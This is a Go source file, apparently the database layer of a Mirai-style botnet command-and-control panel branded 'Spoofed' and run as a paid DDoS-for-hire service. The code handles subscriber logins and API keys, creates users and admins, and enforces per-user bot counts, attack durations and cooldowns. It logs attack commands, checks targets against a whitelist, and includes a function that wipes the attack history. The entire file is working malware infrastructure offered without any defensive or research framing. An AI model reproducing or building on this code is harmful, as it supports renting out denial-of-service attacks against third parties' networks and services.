package main
import (
	"database/sql"
	"encoding/binary"
	"errors"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"net"
	"time"
)
type Database struct {
	db *sql.DB
}
type AccountInfo struct {
	username string
	maxBots  int
	admin    int
}
func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	dsn := fmt.Sprintf("%s:%s@tcp(%s)/%s?charset=utf8mb4&collation=utf8mb4_general_ci&parseTime=true&loc=Local", dbUser, dbPassword, dbAddr, dbName)
	db, err := sql.Open("mysql", dsn)
	if err != nil {
		fmt.Println(err)
	}
	db.Exec("SET NAMES utf8mb4 COLLATE utf8mb4_general_ci")
	db.Exec("SET character_set_connection = 'utf8mb4'")
	db.Exec("SET character_set_client = 'utf8mb4'")
	db.Exec("SET character_set_results = 'utf8mb4'")
	fmt.Println("\033[93m    *\033[0m")
	fmt.Println("\033[93m   **\033[0m")
	fmt.Println("\033[93m  * *\033[0m")
	fmt.Println("\033[93m    * *\033[0m")
	fmt.Println("\033[93m     **\033[0m")
	fmt.Println("\033[93m      *\033[0m")
	fmt.Println("\r\n")
	fmt.Println("\r\n")
	fmt.Println("\033[92m[Spoofed] Starting >\033[0m")
	time.Sleep(3 * time.Second)
	fmt.Println("\033[92m[Spoofed] Starting Killer.. >\033[0m")
	time.Sleep(3 * time.Second)
	fmt.Println("\033[92m[Spoofed] Starting 10 Watchdog.. >\033[0m")
	time.Sleep(3 * time.Second)
	fmt.Println("\033[92m[Spoofed] Starting 3 Selfreps.. >\033[0m")
	time.Sleep(3 * time.Second)
	fmt.Println("\x1b[1;32m[Spoofed] All done! Now connecting...\033[0m")
	return &Database{db}
}
func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
	if this.db == nil {
		fmt.Println("[Database] DB connection is nil")
		return false, AccountInfo{"", 0, 0}
	}
	if err := this.db.Ping(); err != nil {
		fmt.Printf("[Database] Ping failed: %v\n", err)
		return false, AccountInfo{"", 0, 0}
	}
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
	if err != nil {
		fmt.Printf("[Database] Query error: %v\n", err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	if err := rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin); err != nil {
		fmt.Printf("[Database] Scan error: %v\n", err)
		return false, AccountInfo{"", 0, 0}
	}
	return true, accInfo
}
func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}
func (this *Database) createAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}
func (this *Database) fetchAttacks() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM history")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}
func (this *Database) fetchUsers() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM users")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}
func (this *Database) fetchRunningAttacks() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM history where (time_sent + duration) > UNIX_TIMESTAMP()")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}
func (this *Database) removeUser(username string) bool {
	rows, err := this.db.Query("DELETE FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM users WHERE username = ?", username)
	return true
}
func (this *Database) CleanLogs() bool {
	rows, err := this.db.Query("DELETE FROM history")
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM history")
	return true
}
func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)
		ip := net.ParseIP(prefix)
		ip = ip[12:]
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)
		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			if aN > netmask { 
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
			} else if aN < netmask { 
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else { 
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}
func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
	defer rows.Close()
	if err != nil {
		fmt.Println(err)
	}
	var userId, durationLimit, admin, cooldown uint32
	if !rows.Next() {
		return false, errors.New("Your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &admin, &cooldown)
	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("Your max attack time is %d seconds.", durationLimit))
	}
	rows.Close()
	if admin == 0 {
		rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}
	this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	return true, nil
}
func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}
func (this *Database) GetUserHistory(username string, limit int) []map[string]interface{} {
	rows, err := this.db.Query("SELECT h.time_sent, h.duration, h.command, h.max_bots FROM history h JOIN users u ON h.user_id = u.id WHERE u.username = ? ORDER BY h.time_sent DESC LIMIT ?", username, limit)
	if err != nil {
		return nil
	}
	defer rows.Close()
	var history []map[string]interface{}
	for rows.Next() {
		var timeSent, duration, maxBots int
		var command string
		rows.Scan(&timeSent, &duration, &command, &maxBots)
		history = append(history, map[string]interface{}{
			"time_sent": timeSent,
			"duration": duration,
			"command": command,
			"max_bots": maxBots,
		})
	}
	return history
}
